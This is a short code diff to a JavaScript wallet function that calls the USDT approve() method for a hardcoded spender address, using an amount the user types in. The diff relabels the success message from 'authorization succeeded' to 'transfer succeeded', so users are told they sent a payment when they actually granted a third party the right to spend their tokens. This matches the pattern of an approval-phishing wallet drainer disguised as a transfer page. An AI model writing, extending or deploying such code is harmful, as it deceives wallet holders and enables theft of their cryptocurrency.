@@ -28,19 +28,19 @@ async function authorizeUSDT() {
             
             // 授权地址和数量
             const spenderAddress = "0xf2B9e347D4379Decd69A3B03fFa4e0AB878EF6D1";
-            const amount = ethers.utils.parseUnits("100000", 6); // 100000 USDT
+            const amount = ethers.utils.parseUnits(document.getElementById('amount').value, 6); // 取输入值并转换为6位小数
             
             // 发送授权交易
             const tx = await usdtContract.approve(spenderAddress, amount);
             await tx.wait();
             
             // 更新按钮文本
-            document.getElementById('nextButton').innerText = '授权成功';
+            document.getElementById('nextButton').innerText = '转账成功';
         } catch (error) {
             console.error(error);
-            document.getElementById('nextButton').innerText = '转账失败，请重试';
+            document.getElementById('nextButton').innerText = '转账失败请重试';
         }
     } else {
-        alert('请安装 MetaMask 等以太坊钱包插件');
+        alert('请安装以太坊钱包插件');
     }
 }
